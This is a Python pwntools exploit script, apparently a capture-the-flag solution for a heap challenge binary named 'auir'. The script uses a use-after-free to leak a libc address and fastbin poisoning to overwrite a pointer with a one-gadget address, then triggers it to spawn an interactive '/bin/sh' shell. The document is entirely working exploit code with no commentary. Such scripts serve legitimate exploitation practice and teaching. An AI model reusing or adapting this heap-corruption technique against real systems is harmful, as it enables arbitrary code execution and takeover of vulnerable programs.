#!/usr/bin/env python2

import sys,os
from pwn import *

context.update(arch="amd64", endian="little", os="linux", )

TARGET=os.path.realpath("auir")

def make(size, data):
    r.sendlineafter(">>","1")
    r.sendlineafter(">>",str(size))
    r.sendlineafter(">>",data)

def destroy(idx):
    r.sendlineafter(">>","2")
    r.sendlineafter(">>",str(idx))

def fix(idx, data):
    r.sendlineafter(">>","3")
    r.sendlineafter(">>",str(idx))
    r.sendlineafter(">>",str(len(data)))
    r.sendafter(">>",data)

def display(idx):
    r.sendlineafter(">>","4")
    r.sendlineafter(">>",str(idx))

def exploit(r):

    make(0x80,"")
    make(0x60,"")
    destroy(0)
    display(0)
    r.recvline()
    libcbase = u64(r.recv(8))-0x3c4b78
    make(0x60,"")
    destroy(1)
    fix(1,p64(0x6052ed))
    make(0x60,"") #3
    OG = 0x45390
    make(0x60,"A"*19+p64(0x605060))
    fix(0, p64(libcbase+OG))
    make(0x8,"/bin/sh\x00")
    destroy(5)
    r.recvline()
    r.interactive()
    return

if __name__ == "__main__":

    r = process([TARGET,])
    exploit(r)

    sys.exit(0)
